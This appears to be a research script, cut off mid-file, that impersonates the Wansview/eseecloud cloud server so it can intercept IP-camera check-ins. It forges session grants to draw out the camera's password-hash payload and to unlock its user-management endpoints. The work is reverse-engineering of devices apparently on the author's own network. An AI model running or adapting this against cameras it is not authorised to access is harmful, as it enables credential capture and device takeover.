#!/usr/bin/env python3
"""
eseecloud-ws-server.py — WebSocket-terminating fake Wansview cloud server.

The camera's real check-in channel (observed live: port 19000 to
pm.dvr163.com / the cloud's IP) is a WebSocket connection. The camera sends:

    GET / HTTP/1.1
    Upgrade: websocket
    Connection: Upgrade
    Sec-WebSocket-Key: <key>
    Sec-WebSocket-Version: 13

If the server never answers 101 Switching Protocols, the camera retries
forever and the check-in payload (which carries the password hash) never
flows. This server completes the handshake, then reads, unmasks, and logs
every WebSocket frame the camera sends.

USAGE:
  python3 scripts/eseecloud-ws-server.py --ports 19000 --log-dir captures/<s>/
"""

import argparse
import asyncio
import base64
import hashlib
import os
import struct
import sys
import time
from datetime import datetime, timezone
from typing import Optional

WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

# Observed on the live 5523-W check-in channel (port 19000): the camera's first
# frame after the WS upgrade is a fixed 20-byte binary hello whose layout is
#     bytes 0..16 : constant magic prefix d9ffcc028c38eed2d199ac6026947fae
#     bytes 16..20: pconv as uint32 little-endian (serial-derived, e.g. .29 ->
#                   47800389, .169 -> 47816207)
# The real server replies to this hello before the camera sends its registration
# payload (which carries the password hash). REPLY_MODES below implement
# candidate server replies so a live run can elicit that payload.
HELLO_MAGIC = bytes.fromhex("d9ffcc028c38eed2d199ac6026947fae")
HELLO_LEN = 20

# Decoded from live captures of the camera talking to the REAL cloud server
# (172.235.43.92:19000 / 129.153.101.14:19000, sessions 20260808T050802Z and
# 20260808T053046Z). The camera's check-in on :19000 is a four-frame exchange:
#
#   cam->srv  8B  cefaeffe 80 000000                      (hello)
#   srv->cam  8B  cefaeffe 64 000000                      (hello-ack)
#   cam->srv  128B abbccdde 11 <counter:u32LE> <pconv:u32LE>
#                    00000000 0000 0060 0000 00 <serial>
#   srv->cam  100B abbccdde 12 <counter> <pconv>
#                    00000000 0000 44000000 <next-counter>  (session grant)
#
# The server's grant echoes the camera's counter + pconv and issues the next
# counter, which the camera uses on its following connection (verified in the
# captures: counter 8b11a721 -> grant next 3625a721 -> next cam frame 3625a721).
# Byte-accurate real grant layout (decoded 2026-08-08 from captures
# 20260808T050802Z/053046Z, servers 172.235.43.92:19000/129.153.101.14:19000):
#   [0:4]  abbccdde  [4] 0x12  [5:12] 000000000001
#   [12:16] <counter>  [16:20] <pconv>  [20:28] 8 zero bytes
#   [28]   0x44  [29:32] 000000  [32:36] <next-counter>  [36:100] zeros
# An earlier 2-byte misplacement (0x44 at [26], next at [30:34]) made the
# camera silently reject the grant — it read zeros where it expects the
# 0x44 marker and next counter, accepted the handshake, then never advanced.
# A separate frame family (abbccdde 04 ... carrying firmware versions / vendor)
# is a version report; its real reply was not captured.
CEFAFFE_MAGIC = bytes.fromhex("cefaeffe")
ABBCCDDE_MAGIC = bytes.fromhex("abbccdde")
CEFAFFE_ACK = bytes.fromhex("cefaeffe64000000")

# The real server's reply to the 20-byte d9ffcc probe. Probed LIVE against both
# real cloud P2P servers (129.153.101.14:19000 and 172.235.43.92:19000) on
# 2026-08-08: after the HTTP upgrade the camera sends the d9ffcc... probe and
# the real server answers with this constant 16-byte binary frame payload
# (identical for both servers and both pcovs 47800389/47816207):
#     cam->srv  20B  d9ffcc 028c38eed2d199ac6026947fae <pconv:u32LE>
#     srv->cam  16B  96d5390d12fcbe8f4790d932ccd849f3
# An earlier capture (061742Z) showed the camera retrying forever when it got
# an EMPTY frame in reply, so answering with this exact ACK is required for the
# camera to advance past the probe to the cefaeffe/abbccdde check-in.
D9FFCC_ACK = bytes.fromhex("96d5390d12fcbe8f4790d932ccd849f3")

# ── gate-flip rotation variants (reply-mode "rotate") ─────────────────────
# The gate-flip experiment (gate-flip-experiment.sh) runs the fake cloud
# server against a locked camera for a full hour, cycling EVERY candidate
# server reply per registration while a parallel poller watches /user/*.xml.
# This measures whether ANY reply shape — not just the byte-accurate grant —
# can flip the camera's "check in" gate. Variants:
#   cadence   — byte-accurate real grant (counter+pconv echo, 0x44 marker at
#               [28], next-counter at [32:36]) — the known-adopted shape
#   plus1     — same layout, next-counter = counter+1 (legacy, never adopted)
#   badoffset — the 2-byte-shifted grant (0x44 at [26], next at [30:34]) that
#               run 3 proved the camera silently rejects
#   magic     — d9ffcc magic + pconv + zeros ("server acknowledges device")
#   echo      — mirror the registration verbatim
#   empty     — no grant payload at all (camera retry-forever state)
GRANT_VARIANTS = ("cadence", "plus1", "badoffset", "magic", "echo", "empty")

# ── per-camera next-counter cadence ────────────────────────────────────────
# The real server's grant advances the camera's counter by a PER-CAMERA
# amount per check-in: the counter is time-derived, so the delta ≈ the
# camera's counter rate × its ~10s check-in interval. Ground truth
# (eseecloud-real-grants.json, sessions 20260808T050802Z/053046Z) shows two
# distinct clusters — pconv 0x02d96045 (= 47800389, the 10.0.0.29 unit)
# advances ~0x13A0 per check-in while pconv 0x02d99e0f (= 47816207, the
# 10.0.0.169 unit) advances ~0x15A0. A single fixed constant cannot serve the
# fleet (and the old fixed 0x13A0 cadence made the replay test FAIL on the
# .169 pairs). CALIBRATED_CADENCE seeds the known units; the live server
# additionally LEARNS each camera's cadence from the counter rate observed
# between its registrations, so unknown units converge after one re-dial.
DEFAULT_CADENCE = 0x13A0
CALIBRATED_CADENCE = {
    0x02D96045: 0x13A0,  # 10.0.0.29  (real deltas 0x128f..0x13b3)
    0x02D99E0F: 0x15A0,  # 10.0.0.169 (real deltas 0x1497..0x15dc)
}


class CheckinReplay:
    """Per-connection state machine reproducing the real cloud check-in replies.

    Answers the camera's :19000 WebSocket frames exactly like the captured
    real server: hello -> hello-ack, registration -> session grant. When the
    camera receives the grant its internal "check in" state flips to success,
    which (per the firmware's cgi_user.c) unlocks the /user/*.xml user
    management endpoints.
    """

    def __init__(self, next_counter_mode: str = "cadence",
                 cadence_by_pconv: Optional[dict] = None,
                 default_cadence: int = DEFAULT_CADENCE,
                 lite_cadence: Optional[int] = None,
                 rotate_grant: bool = False,
                 rotate_holder: Optional[list] = None):
        self.stage = 0  # 0 = awaiting hello, 1 = awaiting registration
        self.next_counter_mode = next_counter_mode
        # Per-camera cadence map (pconv -> per-check-in counter advance).
        # Passed in by the live server (seeded from CALIBRATED_CADENCE and
        # refined by cadence learning); the replay test passes the per-pconv
        # medians derived from ground truth.
        self.cadence_by_pconv = cadence_by_pconv or {}
        self.default_cadence = default_cadence
        # Gate-flip rotation: when rotate_grant is set, each registration is
        # granted with the NEXT GRANT_VARIANTS shape (cycling cadence -> plus1
        # -> badoffset -> magic -> echo -> empty) so a single long MITM run
        # measures every candidate reply against the /user gate. The variant
        # index MUST be shared across connections (the camera re-dials on a
        # FRESH TCP connection every check-in), so WsCaptureServer owns it and
        # seeds each per-connection replay from the server's counter.
        self.rotate_grant = rotate_grant
        self._variant_index = 0
        self.rotate_holder = rotate_holder
        if rotate_holder is not None:
            self._variant_index = rotate_holder[0]
        # LITE 0x00 keepalive cadence. The camera's NATURAL advance is +0x14
        # per 20 s check-in (verified across 11 frames in T030607Z), so a
        # meaningful experiment MUST grant a DIFFERENT value (e.g. 0x1E): if
        # the camera adopts our granted next-counter, its next LITE counter
        # equals counter+0x1E; if it keeps its own cadence it stays at +0x14.
        # Granting +0x14 would make adoption indistinguishable from the
        # camera ignoring us (false ADOPTED). None = legacy behavior (apply
        # the FULL pconv cadence to LITE frames, never adopted).
        self.lite_cadence = lite_cadence

    def next_reply(self, payload: bytes) -> Optional[bytes]:
        """Return the server reply for this camera frame, or None (no reply)."""
        if len(payload) >= 4 and payload[:4] == CEFAFFE_MAGIC:
            # 8-byte hello (cefaeffe XX 000000). Real server ack observed for
            # the 0x80 variant; answer any variant with the same ack.
            self.stage = 1
            return CEFAFFE_ACK
        if len(payload) >= 16 and payload[:16] == HELLO_MAGIC:
            # 20-byte probe hello (d9ffcc... + pconv). The real server answers
            # with the constant 16-byte ACK D9FFCC_ACK (probed live on both
            # real cloud P2P servers) — NOT an empty frame. Sending the empty
            # frame made the camera retry forever in capture 061742Z.
            return D9FFCC_ACK
        if len(payload) >= 4 and payload[:4] == ABBCCDDE_MAGIC:
            cmd = payload[4] if len(payload) > 4 else 0
            # The camera sends TWO different registration shapes:
            #   * cmd=0x11, 128B  — the FULL registration (serial embedded),
            #     which it sends to the REAL cloud P2P IP (129.153.101.14 /
            #     172.235.43.92:19000). This is the form the real server
            #     grants, and the camera adopts the granted next-counter
            #     verbatim on its next connection (acceptance signal).
            #   * cmd=0x00, 32B  — the LITE form, which it sends to whatever
            #     /address/device pointed it at (our forged server under
            #     MITM). Grants to this form were NEVER adopted (camera kept
            #     its own +0x14 cadence) and the gate stayed closed.
            # We grant either registration-shaped frame (>= 32B, not the
            # cmd=0x04 version report). The full 0x11 form is the one that
            # matters; eseecloud-mitm-capture.sh now redirects + flushes the
            # real P2P IPs so it lands here.
            if len(payload) >= 32 and cmd != 0x04:
                self.stage = 2
                return self._build_grant(payload)
            # cmd 0x04 (version report) or unknown: no captured real reply;
            # log only so the operator can iterate.
            return None
        return None

    @staticmethod
    def describe_registration(payload: bytes) -> str:
        """Human label for an abbccdde frame, used for self-diagnosing logs."""
        if len(payload) < 5:
            return f"abbccdde {len(payload)}B (truncated)"
        cmd = payload[4]
        kind = {0x00: "LITE 0x00", 0x11: "FULL 0x11", 0x04: "VER 0x04"}.get(
            cmd, f"cmd={cmd:02x}")
        # Both the FULL 0x11 and LITE 0x00 forms carry counter at [12:16] and
        # pconv at [16:20] — the LITE layout was verified 2026-08-09 from 11
        # real LITE frames in T030607Z (same field positions as FULL).
        if cmd in (0x00, 0x11) and len(payload) >= 20:
            return (f"{kind} {len(payload)}B counter={payload[12:16].hex()} "
                    f"pconv={payload[16:20].hex()}")
        return f"{kind} {len(payload)}B"

    def _build_grant(self, registration: bytes) -> bytes:
        """Build the reply for a registration.

        In cadence/plus1/badoffset modes this is the 100-byte abbccdde 12
        session grant; magic/echo/empty produce the alternate candidate
        shapes the gate-flip rotation measures. When rotate_grant is set the
        variant advances per registration (cycling GRANT_VARIANTS).
        """
        # Pick the variant: explicit rotate cycle, else the legacy fixed shape.
        variant = GRANT_VARIANTS[self._variant_index % len(GRANT_VARIANTS)] \
            if self.rotate_grant else "cadence"
        if self.rotate_grant:
            self._variant_index += 1
            # Persist the advance into the SHARED holder so the next
            # connection's replay continues the cycle (the camera re-dials on
            # a fresh TCP connection per check-in; a per-connection index
            # would restart at cadence forever).
            if self.rotate_holder is not None:
                self.rotate_holder[0] = self._variant_index

        counter = registration[12:16]
        pconv = registration[16:20]
        if variant == "magic":
            # "Server acknowledges this device" minimal form: magic + pconv.
            return HELLO_MAGIC + pconv + b"\x00" * 4
        if variant == "echo":
            return registration[:128]
        if variant == "empty":
            return b""

        # Grant variants (cadence / plus1 / badoffset) share the next-counter
        # computation; only the byte placement of the 0x44 marker + next
        # differs (badoffset = the run-3 shape the camera silently rejected).
        # LITE 0x00 keepalives (32B, sent to our forged /address/device
        # endpoint under MITM) are granted counter + lite_cadence. This MUST
        # differ from the camera's natural +0x14 cadence so the adoption
        # signal (next LITE counter == granted next) is distinguishable from
        # the camera simply keeping its own cadence.
        is_lite = len(registration) >= 5 and registration[4] == 0x00
        if is_lite and self.lite_cadence is not None:
            next_counter = (struct.unpack("<I", counter)[0] + self.lite_cadence) & 0xFFFFFFFF
        elif self.next_counter_mode == "plus1" or variant == "plus1":
            next_counter = (struct.unpack("<I", counter)[0] + 1) & 0xFFFFFFFF
        else:  # "cadence" — per-camera counter advance (mirrors the real server)
            # Real-cloud grants advance each camera's counter by its OWN cadence
            # (pconv 0x02d96045 ~0x13A0, pconv 0x02d99e0f ~0x15A0 per ~10s
            # check-in), NOT a fleet constant and NOT +1 (the camera never
            # adopted +1 grants under MITM). Use the calibrated/learned value
            # for this camera; fall back to the default for unknown pconvs.
            pconv_int = struct.unpack("<I", pconv)[0]
            cadence = self.cadence_by_pconv.get(pconv_int, self.default_cadence)
            next_counter = (struct.unpack("<I", counter)[0] + cadence) & 0xFFFFFFFF
        grant = bytearray(100)  # zeros: matches the captured real grant tail
        grant[0:4] = ABBCCDDE_MAGIC
        grant[4] = 0x12
        grant[10:12] = b"\x00\x01"
        grant[12:16] = counter
        grant[16:20] = pconv
        if variant == "badoffset":
            # The run-3 misplacement: 0x44 at [26], next at [30:34]. The
            # camera read zeros where it expects the marker and never advanced.
            grant[26] = 0x44
            grant[30:34] = struct.pack("<I", next_counter)
        else:
            # Byte-accurate vs the real server's grants: 0x44 marker at [28],
            # next counter at [32:36] (NOT [26]/[30:34]).
            grant[28] = 0x44
            grant[32:36] = struct.pack("<I", next_counter)
        return bytes(grant)


def ws_accept(key: str) -> str:
    return base64.b64encode(hashlib.sha1((key + WS_GUID).encode()).digest()).decode()


def build_hello_reply(first_payload: bytes, mode: str,
                      custom_hex: str = "") -> Optional[bytes]:
    """Build a candidate server reply for the camera's 20-byte hello.

    For the hello-aware modes (echo / magic / echo-plus) this returns None
    when the frame is not a 20-byte hello (no reply is sent). The custom mode
    always returns the exact --reply-hex payload, which lets an operator send
    any candidate server reply on the first data frame regardless of shape.

    Modes:
      echo      — mirror the camera's exact 20 bytes back verbatim.
      magic     — magic prefix + the camera's pconv + zero session bytes
                  (the minimal "server acknowledges this device" form).
      echo-plus — echo verbatim, then 8 zero bytes (tries to trigger the
                  next handshake stage).
      custom    — exact payload from --reply-hex (sent verbatim).
    """
    if len(first_payload) >= HELLO_LEN and first_payload[:16] == HELLO_MAGIC:
        if mode == "echo":
            return first_payload[:HELLO_LEN]
        if mode == "magic":
            return HELLO_MAGIC + first_payload[16:20] + b"\x00\x00\x00\x00"
        if mode == "echo-plus":
            return first_payload[:HELLO_LEN] + b"\x00" * 8
    if mode == "custom":
        try:
            return bytes.fromhex(custom_hex)
        except ValueError:
            return None
    return None


def build_ws_frame(opcode: int, payload: bytes) -> bytes:
    """Build an unmasked server->client WebSocket frame with correct length
    encoding (single byte, extended 2-byte, or extended 8-byte length)."""
    n = len(payload)
    if n < 126:
        return bytes([0x80 | opcode, n]) + payload
    if n < 65536:
        return bytes([0x80 | opcode, 126]) + struct.pack("!H", n) + payload
    return bytes([0x80 | opcode, 127]) + struct.pack("!Q", n) + payload


def parse_handshake(data: bytes) -> dict:
    """Parse an HTTP Upgrade request. Returns header dict (lowercased keys)."""
    headers = {}
    try:
        text = data.decode("latin-1")
        lines = text.split("\r\n")
        for line in lines[1:]:
            if ":" in line:
                k, _, v = line.partition(":")
                headers[k.strip().lower()] = v.strip()
    except Exception:
        pass
    return headers


def build_101(key: str) -> bytes:
    return (
        "HTTP/1.1 101 Switching Protocols\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Accept: {ws_accept(key)}\r\n"
        "\r\n"
    ).encode()


def parse_ws_frame(buf: bytes):
    """
    Parse ONE WebSocket frame from buf.
    Returns (opcode, payload, consumed, error) — payload already unmasked.
    """
    if len(buf) < 2:
        return None, None, 0, "need more"
    b0, b1 = buf[0], buf[1]
    opcode = b0 & 0x0F
    masked = (b1 & 0x80) != 0
    length = b1 & 0x7F
    pos = 2
    if length == 126:
        if len(buf) < 4:
            return None, None, 0, "need more"
        length = struct.unpack("!H", buf[2:4])[0]
        pos = 4
    elif length == 127:
        if len(buf) < 10:
            return None, None, 0, "need more"
        length = struct.unpack("!Q", buf[2:10])[0]
        pos = 10
    mask_key = None
    if masked:
        if len(buf) < pos + 4:
            return None, None, 0, "need more"
        mask_key = buf[pos:pos + 4]
        pos += 4
    if len(buf) < pos + length:
        return None, None, 0, "need more"
    payload = bytearray(buf[pos:pos + length])
    if mask_key:
        for i in range(len(payload)):
            payload[i] ^= mask_key[i % 4]
    consumed = pos + length
    return opcode, bytes(payload), consumed, None


class WsCaptureServer:
    def __init__(self, ports: list[int], log_dir: str, keepalive: bool = False,
                 reply_mode: str = "", custom_hex: str = "",
                 next_counter_mode: str = "cadence",
                 lite_cadence: Optional[int] = None,
                 lite_monitor: bool = False):
        self.ports = ports
        self.log_dir = log_dir
        self.keepalive = keepalive
        self.reply_mode = reply_mode
        self.custom_hex = custom_hex
        self.next_counter_mode = next_counter_mode
        self.lite_cadence = lite_cadence
        # Shared rotate-cycle counter: the camera opens a FRESH TCP connection
        # per check-in, so the rotate variant index must live here (server
        # scope), not on the per-connection replay, or the cycle would restart
        # at cadence on every re-dial and the other variants would never be
        # measured. Each per-connection CheckinReplay is seeded from and
        # writes back to this holder.
        self.rotate_holder = [0]
        # LITE monitor run-mode: log each camera's observed LITE 0x00 counter
        # delta (LITE_DELTA) and flag the moment it escalates to a FULL 0x11
        # registration after any grant (FULL_ESCALATION). The mitm script
        # passes --lite-monitor so the next run auto-catches the escalation
        # instead of requiring a power-cycle (the run extends on first sight).
        self.lite_monitor = lite_monitor
        self.servers: list[asyncio.AbstractServer] = []
        self.conn_log = os.path.join(log_dir, "eseecloud-connections.log")
        self.data_log = os.path.join(log_dir, "eseecloud-data.bin")
        # Adoption tracker: (pconv, cmd) -> last next-counter we granted. The
        # camera's acceptance signal is that its NEXT registration counter
        # equals this value (verified in real-cloud captures: 774ed924 -> grant
        # next 2a64d924 -> next cam frame 2a64d924). Keying by cmd keeps LITE
        # and FULL grants from contaminating each other's verdict. Logging
        # ADOPTED/NOT-ADOPTED per registration makes a run self-diagnosing
        # without hex dumps.
        self.granted_next_by_pconv: dict[tuple[int, int], int] = {}
        # Per-camera cadence learning state: seeded from the calibrated map,
        # refined live from the camera's observed counter rate between
        # registrations. last_seen_by_pconv maps pconv -> (monotonic ts,
        # counter) of its most recent FULL 0x11 registration.
        self.cadence_by_pconv: dict[int, int] = dict(CALIBRATED_CADENCE)
        self.default_cadence = DEFAULT_CADENCE
        self.last_seen_by_pconv: dict[int, tuple[float, int]] = {}
        # LITE monitor state: per-camera (pconv) -> last (monotonic ts,
        # counter) of its most recent LITE 0x00 registration, plus the set of
        # pconvs we have granted ANY registration to. LITE keepalives arrive
        # one per ~20 s re-dial, each on a FRESH TCP connection, so the
        # counter delta is measured ACROSS the camera's connections (keyed by
        # pconv), not within one connection.
        self.lite_last_by_pconv: dict[int, tuple[float, int]] = {}
        self.granted_pconvs: set[int] = set()

    def _learn_cadence(self, payload: bytes) -> None:
        """Refine a camera's per-check-in cadence from its observed counter
        advance. Runs on every FULL abbccdde 0x11 registration: the counter
        delta between consecutive registrations (dc) IS the per-check-in
        advance the grant must mirror — the real server's observed deltas are
        exactly these per-check-in values (~0x13A0 for pconv 0x02d96045,
        ~0x15A0 for 0x02d99e0f, jittering with the actual check-in interval).
        When the camera ADOPTS our grant the delta equals our own cadence
        (self-consistent, no drift); a NEW-CONN re-dial with its own counter
        reveals the camera's natural cadence, which is exactly the value the
        real server matches. Guarded to plausible advances (0x800..0x4000 per
        check-in, no sub-second re-dials, no reset-sized jumps) so one bad
        sample cannot poison the map."""
        try:
            ctr = struct.unpack("<I", payload[12:16])[0]
            pconv = struct.unpack("<I", payload[16:20])[0]
        except (struct.error, IndexError):
            return
        now = time.monotonic()
        prev = self.last_seen_by_pconv.get(pconv)
        self.last_seen_by_pconv[pconv] = (now, ctr)
        if prev is None:
            return
        t0, c0 = prev
        dt = now - t0
        dc = (ctr - c0) & 0xFFFFFFFF
        # Ignore sub-second re-dials and absurd jumps (capture noise / reset).
        if dt <= 0.5 or dc == 0 or dc > 0x100000:
            return
        # dc IS the camera's measured per-check-in counter advance (observed
        # ~0x139C..0x15B1 per real check-in) — the exact value the grant must
        # mirror. Deriving a rate and multiplying by a nominal interval adds
        # error when the real interval differs (observed ~10s vs the real
        # cloud, ~20s under MITM) and would double the sanity-band logic.
        cadence = dc
        if 0x800 <= cadence <= 0x4000 and cadence != self.cadence_by_pconv.get(pconv, 0):
            old = self.cadence_by_pconv.get(pconv, self.default_cadence)
            self.cadence_by_pconv[pconv] = cadence
            print(f"  [WS] learned cadence pconv=0x{pconv:08x}: 0x{cadence:04x} "
                  f"(per-check-in advance, was 0x{old:04x})")

    def _adoption_check(self, payload: bytes) -> str:
        """Return a one-line adoption verdict for an abbccdde registration
        (FULL 0x11 or LITE 0x00 — the LITE [12:20] counter/pconv layout was
        verified 2026-08-09 from 11 real LITE frames in T030607Z). Other
        frames get no verdict ("" = silent)."""
        if len(payload) < 20 or payload[4] not in (0x00, 0x11):
            return ""
        try:
            counter = struct.unpack("<I", payload[12:16])[0]
            pconv = struct.unpack("<I", payload[16:20])[0]
        except (struct.error, IndexError):
            return ""
        # Key by (pconv, cmd) so a LITE grant can't contaminate the FULL
        # verdict for the same camera (and vice versa) in mixed sessions.
        last = self.granted_next_by_pconv.get((pconv, payload[4]))
        if last is None:
            return f"pconv={pconv:08x} first-seen"
        if counter == last:
            return (f"pconv={pconv:08x} ★★★ ADOPTED ★★★ "
                    f"(reg counter {counter:08x} == our granted next)")
        return (f"pconv={pconv:08x} NOT-ADOPTED (reg counter {counter:08x}, "
                f"we granted next {last:08x})")

    def _lite_delta_check(self, payload: bytes, src: str = "",
                          port: int = 0) -> None:
        """Log the camera's observed LITE cadence + flag FULL escalation.

        LITE 0x00 keepalives arrive one per ~20 s re-dial, each on a FRESH
        TCP connection, so the counter delta is measured ACROSS the camera's
        connections (keyed by pconv). Every LITE frame logs a LITE_DELTA line
        with the observed advance (natural +0x14, or +lite_cadence = adopted).
        A FULL 0x11 registration arriving for a camera we have already granted
        anything is logged as FULL_ESCALATION — the camera attempting full
        registration = the adoption precondition that previously needed a
        power-cycle to surface. The mitm script greps both markers.
        """
        if len(payload) < 20:
            return
        try:
            ctr = struct.unpack("<I", payload[12:16])[0]
            pconv = struct.unpack("<I", payload[16:20])[0]
        except (struct.error, IndexError):
            return
        now = time.monotonic()
        if payload[4] == 0x00:  # LITE — delta vs this camera's last LITE frame
            prev = self.lite_last_by_pconv.get(pconv)
            self.lite_last_by_pconv[pconv] = (now, ctr)
            if prev is None:
                line = (f"LITE_DELTA pconv={pconv:08x} counter={ctr:08x} "
                        f"first-seen (no prior LITE frame to delta)")
            else:
                t0, c0 = prev
                dt = now - t0
                dc = (ctr - c0) & 0xFFFFFFFF
                note = ""
                if self.lite_cadence is not None and dc == self.lite_cadence:
                    note = " ★ ADOPTED — equals our granted lite-cadence ★"
                elif dc == 0x14:
                    note = " (natural +0x14 cadence — grant not adopted)"
                line = (f"LITE_DELTA pconv={pconv:08x} {c0:08x}->{ctr:08x} "
                        f"delta=+0x{dc:x} over {dt:.1f}s{note}")
            print(f"  [WS :{port}] {src} {line}")
            self._log(port, src, line)
        elif payload[4] == 0x11 and pconv in self.granted_pconvs:
            # FULL 0x11 after a grant = the camera believes its cloud session
            # is valid and is attempting full registration. This is the exact
            # signal that previously required a power-cycle + rerun to catch.
            line = (f"FULL_ESCALATION ★★★ pconv={pconv:08x} FULL 0x11 "
                    f"registration after we granted this camera — camera "
                    f"believes it has a valid cloud session (adoption "
                    f"precondition met); next registrations should ADOPT our "
                    f"next-counter")
            print(f"  [WS :{port}] {src} {line}")
            self._log(port, src, line)

    async def start(self):
        for port in self.ports:
            try:
                server = await asyncio.start_server(
                    lambda r, w: self._handle(r, w, port),
                    host="0.0.0.0",
                    port=port,
                )
                self.servers.append(server)
                print(f"  [WS] fake WebSocket server listening on tcp :{port}")
            except OSError as e:
                print(f"  [WS] WARNING: cannot bind :{port}: {e}", file=sys.stderr)
        if not self.servers:
            raise SystemExit("  [WS] no ports bound — nothing to do")

    def stop(self):
        for s in self.servers:
            s.close()

    def _log(self, port: int, src: str, line: str):
        with open(self.conn_log, "a") as f:
            f.write(f"{datetime.now(timezone.utc).isoformat()} {line} port={port} "
                    f"src={src}\n")

    def _log_data(self, port: int, payload: bytes):
        ts = datetime.now(timezone.utc)
        with open(self.conn_log, "a") as f:
            f.write(f"{ts.isoformat()} DATA port={port} len={len(payload)} "
                    f"hex={payload[:128].hex()}\n")
        with open(self.data_log, "ab") as f:
            f.write(struct.pack("!Q", int(ts.timestamp() * 1_000_000)))
            f.write(struct.pack("!I", port))
            f.write(struct.pack("!I", len(payload)))
            f.write(payload)

    async def _handle(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
                      port: int):
        addr = writer.get_extra_info("peername")
        src = f"{addr[0]}:{addr[1]}"
        print(f"  [WS :{port}] CONNECT {src}")
        self._log(port, src, f"CONNECT {src} -> :{port}")
        try:
            # Peek the first chunk to distinguish the two connection styles the
            # camera uses on :19000:
            #   1. HTTP Upgrade path (GET / ... Upgrade: websocket) — used for
            #      the d9ffcc probe connections.
            #   2. RAW WebSocket frames with NO HTTP handshake — observed live
            #      to the real cloud IPs (129.153.101.14:19000 /
            #      172.235.43.92:19000): the camera opens the socket and
            #      immediately sends masked WS frames: cefaeffe 80 000000
            #      (hello) + abbccdde 11 ... (registration). The real server
            #      answers with unmasked ack + grant. iptables REDIRECT lands
            #      these on us, so we must speak raw WS or the frames are
            #      consumed waiting for headers that never arrive.
            first = await asyncio.wait_for(reader.read(4096), timeout=10.0)
            if not first:
                return
            if first.startswith(b"GET "):
                # ── HTTP Upgrade path ──
                if b"\r\n\r\n" in first:
                    # Handshake and any pipelined first WS frame arrived in the
                    # same chunk — the frame bytes live in `first`, NOT the
                    # StreamReader (read(4096) consumed them), so keep them.
                    idx = first.index(b"\r\n\r\n")
                    handshake = first[:idx + 4]
                    buf = first[idx + 4:]
                else:
                    # Handshake split across chunks: readuntil leaves any
                    # trailing frame bytes in the StreamReader, so the frame
                    # loop's timed read picks them up on its first iteration.
                    handshake = first + await asyncio.wait_for(
                        reader.readuntil(b"\r\n\r\n"), timeout=10.0)
                    buf = b""
                headers = parse_handshake(handshake)
                key = headers.get("sec-websocket-key", "")
                print(f"  [WS :{port}] handshake from {src}, key={key!r}")
                self._log(port, src, f"UPGRADE {src} key={key}")
                if not key:
                    print(f"  [WS :{port}] no Sec-WebSocket-Key — closing")
                    writer.close()
                    return
                writer.write(build_101(key))
                await writer.drain()
                print(f"  [WS :{port}] sent 101 Switching Protocols to {src}")
            else:
                # ── RAW WebSocket frames (no handshake) ──
                print(f"  [WS :{port}] RAW WS frames from {src} "
                      f"(first={first[:8].hex()}) — no HTTP upgrade")
                self._log(port, src, f"RAWWS {src} first={first[:8].hex()}")
                buf = first
            replied = False
            hello_miss_logged = False
            replay = CheckinReplay(self.next_counter_mode,
                                   cadence_by_pconv=self.cadence_by_pconv,
                                   default_cadence=self.default_cadence,
                                   lite_cadence=self.lite_cadence,
                                   rotate_grant=(self.reply_mode == "rotate"),
                                   rotate_holder=self.rotate_holder) \
                if self.reply_mode in ("replay", "rotate") else None
            while True:
                # Process every COMPLETE frame already buffered FIRST, then wait
                # for more data. This matters for the RAW path and for
                # pipelined upgrade frames: the camera sends its hello +
                # registration back-to-back in one burst and then waits for a
                # reply — if we waited for a subsequent read before parsing,
                # the frames would sit in buf unparsed until the read timeout
                # killed the connection (observed in E2E: ack never sent).
                while True:
                    opcode, payload, consumed, err = parse_ws_frame(buf)
                    if err is not None or opcode is None:
                        break
                    buf = buf[consumed:]
                    if opcode == 8:  # close
                        print(f"  [WS :{port}] {src} sent CLOSE frame")
                        # Echo the close so the camera cleanly tears down.
                        try:
                            writer.write(b"\x88\x00")
                            await writer.drain()
                        except Exception:
                            pass
                        break
                    if opcode == 9:  # ping
                        print(f"  [WS :{port}] {src} PING {payload.hex()}")
                        try:
                            writer.write(b"\x8a" + bytes([len(payload)]) + payload)
                            await writer.drain()
                        except Exception:
                            pass
                        continue
                    if opcode == 10:  # pong
                        continue
                    print(f"  [WS :{port}] {src} FRAME opcode={opcode} "
                          f"len={len(payload)}")
                    self._log_data(port, payload)
                    for off in range(0, len(payload), 16):
                        chunkb = payload[off:off + 16]
                        hexs = " ".join(f"{b:02x}" for b in chunkb)
                        asciis = "".join(chr(b) if 32 <= b < 127 else "." for b in chunkb)
                        print(f"      {off:04x}  {hexs:<48s}  |{asciis}|")
                    # Protocol-aware replies. In replay mode a per-connection
                    # state machine answers EVERY binary frame exactly like the
                    # captured real cloud server (hello -> ack, registration ->
                    # grant), which should flip the camera's "check in success"
                    # state and unlock the /user/*.xml endpoints. In the other
                    # modes only the FIRST data frame is answered with the
                    # configured candidate reply.
                    if opcode in (0x2, 0x1):
                        if replay is not None:
                            # Self-diagnosing log: which registration shape the
                            # camera sent (LITE 0x00 vs FULL 0x11) and whether
                            # the next connection adopts our granted counter
                            # (the real acceptance signal).
                            if len(payload) >= 4 and payload[:4] == ABBCCDDE_MAGIC:
                                verdict = self._adoption_check(payload)
                                line = (f"REGISTER "
                                        f"{CheckinReplay.describe_registration(payload)}")
                                if verdict:
                                    line += f" | {verdict}"
                                self._log(port, src, line)
                                # Learn the per-camera cadence BEFORE building
                                # this grant so the very next reply already uses
                                # the refined value.
                                if len(payload) >= 20 and payload[4] == 0x11:
                                    self._learn_cadence(payload)
                            # LITE monitor: sole call site — logs LITE 0x00
                            # cadence deltas (LITE_DELTA) and flags FULL 0x11
                            # escalation after any grant (FULL_ESCALATION),
                            # gated on --lite-monitor.
                            if (self.lite_monitor and len(payload) >= 20
                                    and payload[:4] == ABBCCDDE_MAGIC):
                                self._lite_delta_check(payload, src=src, port=port)
                            reply = replay.next_reply(payload)
                            if reply is not None:
                                # Record what we granted for this pconv so the
                                # next registration's adoption check can judge
                                # acceptance (counter == granted next).
                                # Record what we granted for this pconv so the
                                # next registration's adoption check can judge
                                # acceptance (counter == granted next). Only
                                # true 100-byte abbccdde 0x12 grant shapes
                                # carry a meaningful next-counter — the magic
                                # (24B), echo (128B reg mirror) and empty (0B)
                                # rotate variants must NOT pollute the map.
                                if (len(payload) >= 20
                                        and len(reply) >= 36
                                        and payload[:4] == ABBCCDDE_MAGIC
                                        and payload[4] in (0x00, 0x11)
                                        and reply[4] == 0x12):
                                    try:
